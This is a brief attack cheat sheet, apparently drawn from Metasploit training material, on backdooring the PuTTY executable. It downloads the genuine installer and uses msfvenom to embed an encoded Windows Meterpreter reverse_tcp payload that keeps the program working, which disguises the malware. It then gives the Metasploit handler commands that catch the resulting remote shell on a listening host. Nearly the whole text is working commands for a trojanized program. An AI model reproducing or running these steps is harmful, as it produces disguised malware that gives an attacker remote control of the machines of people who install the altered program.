Bind windows reverse_tcp payload

wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe

msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe

Start Listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 192.168.1.101
set LPORT 443
exploit



More details
https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/
